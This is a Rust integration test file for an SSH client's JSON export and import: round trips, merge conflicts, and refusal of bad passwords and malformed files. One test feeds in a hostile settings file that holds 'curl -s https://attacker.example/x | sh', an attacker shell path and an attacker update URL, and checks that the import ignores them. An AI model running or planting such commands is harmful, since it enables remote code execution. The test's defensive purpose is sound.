//! The round trip of the native JSON export (SPEC principle 4;
//! docs/storage-format.md, sections 13.2 and 13.3; night decision D34),
//! the main test of the project's data ownership: export, import into a new
//! empty store, and every host, group, tag, key, identity, known host and
//! setting is the same, plain and encrypted. Then the merge rules: a second
//! import adds nothing, a conflicting record is kept as a suffixed copy,
//! wrong passwords and hostile files are refused. Every secret is
//! generated at run time.

mod common;
mod stage2;

use std::collections::BTreeMap;

use common::{first_run, reasons, save};
use secrecy::{ExposeSecret, SecretString};
use serde_json::{Value, json};
use shellpp_core::Core;
use shellpp_core::ValidationReason;
use shellpp_core::keys::generate::KeyKind;
use shellpp_core::model::identity::PasswordChange;
use shellpp_core::service::dto::{
    DataExportInput, DataImportInput, KeyGenerateInput, KnownHostAddInput, RecordType,
    SettingsSetInput,
};
use shellpp_core::service::keychain::IdentitySaveInput;
use uuid::Uuid;

/// Content of a vault worth comparing: (type, record id) -> data, for the
/// types an import takes, and the settings. Read from a plain export.
type Content = (BTreeMap<(String, String), Value>, Value);

fn content(core: &Core) -> Content {
    let export = core
        .data_export(DataExportInput::default())
        .expect("export");
    let document: Value = serde_json::from_str(export.text.expose_secret()).expect("json");
    assert_eq!(document["format"], "shellpp.export.v1");
    let mut records = BTreeMap::new();
    for record in document["vaults"][0]["records"]
        .as_array()
        .expect("records")
    {
        let kind = record["type"].as_str().unwrap().to_owned();
        if ["group", "host", "key", "identity", "known_host"].contains(&kind.as_str()) {
            let id = record["record_id"].as_str().unwrap().to_owned();
            records.insert((kind, id), record["data"].clone());
        }
    }
    (records, document["settings"].clone())
}

/// A store with some of everything, secrets included.
fn populated() -> common::Unlocked {
    let u = first_run();
    let vault = u.vault_id;
    let prod = save(
        &u.core,
        vault,
        None,
        RecordType::Group,
        json!({"name": "prod", "ssh": {"username": "deploy", "port": 2222}}),
        &[],
    )
    .expect("group");
    let web = save(
        &u.core,
        vault,
        None,
        RecordType::Group,
        json!({"name": "web", "parent_id": prod.record_id().to_string()}),
        &[],
    )
    .expect("nested group");
    let key = u
        .core
        .key_generate(KeyGenerateInput {
            vault_id: vault,
            label: "deploy key".to_owned(),
            kind: KeyKind::Ed25519,
            passphrase: Some(stage2::passphrase()),
            save_passphrase: true,
        })
        .expect("key")
        .key;
    let identity = u
        .core
        .identity_save(IdentitySaveInput {
            vault_id: vault,
            record_id: None,
            label: "ops".to_owned(),
            username: "ops".to_owned(),
            key_id: Some(key.record_id),
            password: PasswordChange::Set(SecretString::from(format!(
                "pw-{}",
                common::random_hex()
            ))),
        })
        .expect("identity");
    let password = format!("pw-{}", common::random_hex());
    let web1 = save(
        &u.core,
        vault,
        None,
        RecordType::Host,
        json!({
            "label": "web-1",
            "address": "web1.example.com",
            "group_id": web.record_id().to_string(),
            "tags": ["prod", "web"],
            "color": "ocean",
            "notes": "the first web server",
            "ssh": {"port": 2200}
        }),
        &[("ssh.password", Some(password.as_str()))],
    )
    .expect("host with password");
    // A detected OS (a member a save never takes from its input).
    let detected =
        shellpp_core::os_detect::from_banner("SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13").expect("os");
    assert!(
        u.core
            .host_os_detected(
                shellpp_core::service::dto::RecordRef {
                    vault_id: vault,
                    record_id: web1.record_id(),
                },
                detected,
                shellpp_core::service::dto::OsSource::Banner,
            )
            .expect("os saved")
    );
    save(
        &u.core,
        vault,
        None,
        RecordType::Host,
        json!({
            "label": "db",
            "address": "192.0.2.44",
            "tags": ["prod"],
            "ssh": {"identity_id": identity.record_id.to_string()}
        }),
        &[],
    )
    .expect("host with identity");
    let key_blob = {
        let key = stage2::generate(stage2::KeyKind::Ed25519, "");
        let line = key.public_key().to_openssh().unwrap();
        line.split_whitespace().nth(1).unwrap().to_owned()
    };
    u.core
        .known_host_add(KnownHostAddInput {
            host: "web1.example.com".to_owned(),
            port: Some(2200),
            key_type: "ssh-ed25519".to_owned(),
            public_key: key_blob,
            revoked: false,
            comment: None,
        })
        .expect("known host");
    u.core
        .settings_set(SettingsSetInput {
            values: BTreeMap::from([
                ("terminal.copy_on_select".to_owned(), json!(true)),
                ("terminal.bell_sound".to_owned(), json!(true)),
            ]),
            reset: Vec::new(),
        })
        .expect("settings");
    u
}

fn import(
    core: &Core,
    text: &SecretString,
    password: Option<&str>,
) -> shellpp_core::service::dto::DataImportSummary {
    core.data_import(DataImportInput::new(
        text.clone(),
        password.map(|value| SecretString::from(value.to_owned())),
    ))
    .expect("import")
}

#[test]
fn plain_and_encrypted_exports_round_trip_into_an_empty_store() {
    let source = populated();
    let expected = content(&source.core);
    let counted = expected.0.len();
    assert_eq!(
        counted, 7,
        "2 groups, 1 key, 1 identity, 2 hosts, 1 known host"
    );

    let plain = source
        .core
        .data_export(DataExportInput::default())
        .expect("plain export");
    assert!(!plain.encrypted);
    assert!(plain.file_name.starts_with("shellpp-export-"));
    assert!(plain.file_name.ends_with(".json"));
    assert!(!plain.file_name.ends_with(".encrypted.json"));

    let export_password = format!("export-{}", common::random_hex());
    let encrypted = source
        .core
        .data_export(DataExportInput {
            password: Some(SecretString::from(export_password.clone())),
            ..DataExportInput::default()
        })
        .expect("encrypted export");
    assert!(encrypted.encrypted);
    assert!(encrypted.file_name.ends_with(".encrypted.json"));
    // Nothing of the content is in the clear.
    let outer: Value = serde_json::from_str(encrypted.text.expose_secret()).unwrap();
    assert_eq!(outer["format"], "shellpp.export.encrypted.v1");
    assert!(!encrypted.text.expose_secret().contains("web1.example.com"));
    assert!(!encrypted.text.expose_secret().contains("deploy key"));

    for (text, password) in [
        (&plain.text, None),
        (&encrypted.text, Some(export_password.as_str())),
    ] {
        let target = first_run();
        let summary = import(&target.core, text, password);
        assert_eq!(summary.added, counted);
        assert_eq!(summary.existing, 0);
        assert_eq!(summary.conflicts, 0);
        assert!(summary.refused.is_empty(), "{:?}", summary.refused);
        assert!(summary.settings > 0);
        let actual = content(&target.core);
        assert_eq!(
            actual.0, expected.0,
            "records (secrets included) are the same"
        );
        assert_eq!(actual.1, expected.1, "settings are the same");
        // The key still opens with its saved passphrase and has its
        // fingerprint; the identity still links it.
        let keys = target.core.keys_list().unwrap();
        assert_eq!(keys.len(), 1);
        assert!(keys[0].passphrase_saved);
        assert_eq!(
            keys[0].fingerprint,
            source.core.keys_list().unwrap()[0].fingerprint
        );
        let identities = target.core.identities_list().unwrap();
        assert_eq!(identities[0].key_id, Some(keys[0].record_id));
        assert_eq!(target.core.known_hosts_list().unwrap().len(), 1);
    }
}

#[test]
fn a_second_import_adds_nothing_and_a_conflict_keeps_both_versions() {
    let source = populated();
    let export = source.core.data_export(DataExportInput::default()).unwrap();
    let target = first_run();
    assert_eq!(import(&target.core, &export.text, None).added, 7);
    let again = import(&target.core, &export.text, None);
    assert_eq!(again.added, 0);
    assert_eq!(again.existing, 7);
    assert_eq!(again.conflicts, 0);

    // The host "db" changes here; the next import keeps it and adds the
    // exported version as a suffixed copy.
    let (records, _) = content(&target.core);
    let ((_, db_id), db) = records
        .iter()
        .find(|((kind, _), data)| kind == "host" && data["label"] == "db")
        .unwrap();
    let db_id = Uuid::parse_str(db_id).unwrap();
    let mut changed = db.clone();
    changed["notes"] = json!("changed after the export");
    save(
        &target.core,
        target.vault_id,
        Some(db_id),
        RecordType::Host,
        changed,
        &[],
    )
    .unwrap();
    let third = import(&target.core, &export.text, None);
    assert_eq!(third.conflicts, 1);
    assert_eq!(third.existing, 6);
    let (records, _) = content(&target.core);
    let hosts: Vec<&Value> = records
        .iter()
        .filter(|((kind, _), _)| kind == "host")
        .map(|(_, data)| data)
        .collect();
    assert_eq!(hosts.len(), 3);
    assert!(
        hosts
            .iter()
            .any(|host| host["label"] == "db" && host["notes"] == "changed after the export")
    );
    assert!(hosts.iter().any(|host| host["label"] == "db (imported)"));
    // The local one is unchanged under its id.
    assert_eq!(
        records[&("host".to_owned(), db_id.to_string())]["notes"],
        "changed after the export"
    );

    // The same file once more: the copy is found by its import key
    // (`json:<exported id>`, data-model 18.4), no second copy is made.
    let fourth = import(&target.core, &export.text, None);
    assert_eq!(fourth.conflicts, 0);
    assert_eq!(fourth.added, 0);
    assert_eq!(fourth.existing, 7);
    let (records, _) = content(&target.core);
    let copies: Vec<&Value> = records
        .iter()
        .filter(|((kind, _), data)| kind == "host" && data["label"] == "db (imported)")
        .map(|(_, data)| data)
        .collect();
    assert_eq!(copies.len(), 1);
    assert_eq!(copies[0]["import_key"], format!("json:{db_id}"));
}

#[test]
fn a_key_found_under_another_id_keeps_the_references_to_it() {
    let source = populated();
    let key_id = source.core.keys_list().unwrap()[0].record_id;
    let keyed = save(
        &source.core,
        source.vault_id,
        None,
        RecordType::Group,
        json!({"name": "keyed", "ssh": {"key_id": key_id.to_string()}}),
        &[],
    )
    .expect("group with a key");
    let export = source.core.data_export(DataExportInput::default()).unwrap();
    let target = first_run();
    assert_eq!(import(&target.core, &export.text, None).added, 8);

    // The same key under another id (imported on its own on another
    // device), named by a group that is new here.
    let other_key = Uuid::now_v7();
    let new_group = Uuid::now_v7();
    let text = export
        .text
        .expose_secret()
        .replace(&key_id.to_string(), &other_key.to_string())
        .replace(&keyed.record_id().to_string(), &new_group.to_string());
    let summary = import(&target.core, &SecretString::from(text), None);
    assert_eq!(summary.added, 1, "only the group is new");
    assert_eq!(
        summary.conflicts, 0,
        "records that name the key are the same once it is the local one"
    );
    let (records, _) = content(&target.core);
    let group = &records[&("group".to_owned(), new_group.to_string())];
    assert_eq!(group["ssh"]["key_id"], key_id.to_string());
    assert!(
        !records.contains_key(&("key".to_owned(), other_key.to_string())),
        "the key stays local"
    );
}

#[test]
fn settings_that_run_or_open_something_never_come_from_a_file() {
    let source = populated();
    let export = source.core.data_export(DataExportInput::default()).unwrap();
    let mut document: Value = serde_json::from_str(export.text.expose_secret()).unwrap();
    // A shared "host list" that also carries settings (security.md TB7).
    let hostile = [
        (
            "terminal.os_detection_script",
            json!("curl -s https://attacker.example/x | sh"),
        ),
        ("terminal.os_detection_enabled", json!(false)),
        ("terminal.local_shell", json!("/opt/attacker/shell")),
        ("sftp.open_program", json!("attacker-open")),
        (
            "updates.manifest_url",
            json!("https://attacker.example/manifest.json"),
        ),
        ("updates.auto_check", json!(true)),
        ("security.auto_lock_minutes", json!(1440)),
        ("logs.record_output", json!(true)),
        ("logs.retention_days", json!(1)),
        ("terminal.record_history", json!(false)),
        ("terminal.import_shell_history", json!(true)),
        ("terminal.confirm_multiline_paste", json!(false)),
        ("sftp.confirm_delete", json!(false)),
        ("sftp.name_conflict", json!("replace")),
    ];
    for (key, value) in &hostile {
        document["settings"][*key] = value.clone();
    }
    document["settings"]["terminal.font_size"] = json!(18);
    let target = first_run();
    let defaults = content(&target.core).1;
    let summary = import(
        &target.core,
        &SecretString::from(document.to_string()),
        None,
    );
    assert_eq!(summary.settings_left_out, hostile.len());
    let settings = content(&target.core).1;
    for (key, _) in &hostile {
        assert_eq!(settings[*key], defaults[*key], "{key} stays as it was");
    }
    assert_eq!(settings["terminal.font_size"], 18, "the look comes along");
    assert_eq!(settings["terminal.copy_on_select"], true);
}

#[test]
fn wrong_passwords_and_hostile_files_are_refused() {
    let source = populated();
    let password = format!("export-{}", common::random_hex());
    let encrypted = source
        .core
        .data_export(DataExportInput {
            password: Some(SecretString::from(password.clone())),
            ..DataExportInput::default()
        })
        .unwrap();
    let target = first_run();
    let attempt = |text: &str, password: Option<&str>| {
        target.core.data_import(DataImportInput::new(
            SecretString::from(text.to_owned()),
            password.map(|value| SecretString::from(value.to_owned())),
        ))
    };
    assert_eq!(
        reasons(attempt(encrypted.text.expose_secret(), None).unwrap_err()),
        vec![("password".to_owned(), ValidationReason::Required)]
    );
    assert_eq!(
        reasons(attempt(encrypted.text.expose_secret(), Some("wrong password")).unwrap_err()),
        vec![("password".to_owned(), ValidationReason::Invalid)]
    );
    // KDF parameters below the floor: refused before deriving.
    let mut weak: Value = serde_json::from_str(encrypted.text.expose_secret()).unwrap();
    weak["kdf"]["m_kib"] = json!(8);
    assert_eq!(
        reasons(attempt(&weak.to_string(), Some(&password)).unwrap_err()),
        vec![("text".to_owned(), ValidationReason::NotAllowed)]
    );
    // Not an export.
    for text in ["", "not json", "[]", r#"{"format":"other"}"#] {
        assert_eq!(
            reasons(attempt(text, None).unwrap_err()),
            vec![("text".to_owned(), ValidationReason::Invalid)],
            "{text}"
        );
    }
    // Too short an export password.
    assert_eq!(
        reasons(
            source
                .core
                .data_export(DataExportInput {
                    password: Some(SecretString::from("short".to_owned())),
                    ..DataExportInput::default()
                })
                .unwrap_err()
        ),
        vec![("password".to_owned(), ValidationReason::TooShort)]
    );
    // A record that breaks the rules is refused with its errors; the others
    // are imported.
    let plain = source.core.data_export(DataExportInput::default()).unwrap();
    let mut document: Value = serde_json::from_str(plain.text.expose_secret()).unwrap();
    let records = document["vaults"][0]["records"].as_array_mut().unwrap();
    let bad = records
        .iter_mut()
        .find(|record| record["type"] == "host" && record["data"]["label"] == "db")
        .unwrap();
    bad["data"]["ssh"]["port"] = json!(70000);
    records.push(json!({
        "record_id": Uuid::now_v7().to_string(),
        "type": "snippet_of_the_future",
        "data": {}
    }));
    let summary = target
        .core
        .data_import(DataImportInput {
            apply_settings: false,
            ..DataImportInput::new(SecretString::from(document.to_string()), None)
        })
        .unwrap();
    assert_eq!(summary.refused.len(), 1);
    assert_eq!(summary.refused[0].record_type, "host");
    assert!(summary.skipped >= 1, "unknown types are skipped");
    assert_eq!(summary.settings, 0, "settings left alone on request");
    assert!(summary.added >= 6);
}

/// A copy from an earlier import is matched only while it holds the same
/// (D41): a newer version of the record in a later export is imported as
/// another copy instead of being taken for the old one.
#[test]
fn a_newer_version_of_a_copied_record_is_not_dropped() {
    let source = populated();
    let first = source.core.data_export(DataExportInput::default()).unwrap();
    let target = first_run();
    import(&target.core, &first.text, None);
    let db_id = |core: &Core| {
        content(core)
            .0
            .into_iter()
            .find(|((kind, _), data)| kind == "host" && data["label"] == "db")
            .map(|((_, id), data)| (Uuid::parse_str(&id).unwrap(), data))
            .unwrap()
    };
    // Changed on both sides: the first copy.
    let (id, mut data) = db_id(&target.core);
    data["notes"] = json!("changed here");
    save(
        &target.core,
        target.vault_id,
        Some(id),
        RecordType::Host,
        data,
        &[],
    )
    .unwrap();
    assert_eq!(import(&target.core, &first.text, None).conflicts, 1);
    // The source changes it again: its next export is not the old copy.
    let (id, mut data) = db_id(&source.core);
    data["address"] = json!("192.0.2.45");
    save(
        &source.core,
        source.vault_id,
        Some(id),
        RecordType::Host,
        data,
        &[],
    )
    .unwrap();
    let second = source.core.data_export(DataExportInput::default()).unwrap();
    let summary = import(&target.core, &second.text, None);
    assert_eq!(summary.conflicts, 1, "the newer version is kept as a copy");
    let addresses: Vec<String> = content(&target.core)
        .0
        .into_iter()
        .filter(|((kind, _), _)| kind == "host")
        .filter_map(|(_, data)| data["address"].as_str().map(str::to_owned))
        .collect();
    assert!(
        addresses.contains(&"192.0.2.45".to_owned()),
        "{addresses:?}"
    );
    // And that file once more adds nothing.
    assert_eq!(import(&target.core, &second.text, None).conflicts, 0);
}

/// A record that names a record copied by an earlier import is the same
/// once that copy is found, whatever the order of their types: no copy of
/// it on the next import of the same file.
#[test]
fn records_that_name_a_copied_record_are_not_copied_again() {
    let source = populated();
    let first = source.core.data_export(DataExportInput::default()).unwrap();
    let target = first_run();
    import(&target.core, &first.text, None);
    // The identity changes here, then the source adds a group that names it.
    let identity = target.core.identities_list().unwrap()[0].clone();
    target
        .core
        .identity_save(IdentitySaveInput {
            vault_id: target.vault_id,
            record_id: Some(identity.record_id),
            label: "ops here".to_owned(),
            username: "ops".to_owned(),
            key_id: identity.key_id,
            password: PasswordChange::Keep,
        })
        .unwrap();
    save(
        &source.core,
        source.vault_id,
        None,
        RecordType::Group,
        json!({"name": "by identity", "ssh": {"identity_id": identity.record_id.to_string()}}),
        &[],
    )
    .unwrap();
    let second = source.core.data_export(DataExportInput::default()).unwrap();
    let summary = import(&target.core, &second.text, None);
    assert_eq!(summary.conflicts, 1, "the identity");
    assert_eq!(
        summary.added, 1,
        "the group, pointing to the identity's copy"
    );
    let again = import(&target.core, &second.text, None);
    assert_eq!(again.conflicts, 0, "{again:?}");
    assert_eq!(again.added, 0);
    let groups = content(&target.core)
        .0
        .into_iter()
        .filter(|((kind, _), data)| kind == "group" && data["name"] == "by identity (imported)")
        .count();
    assert_eq!(groups, 0);
}
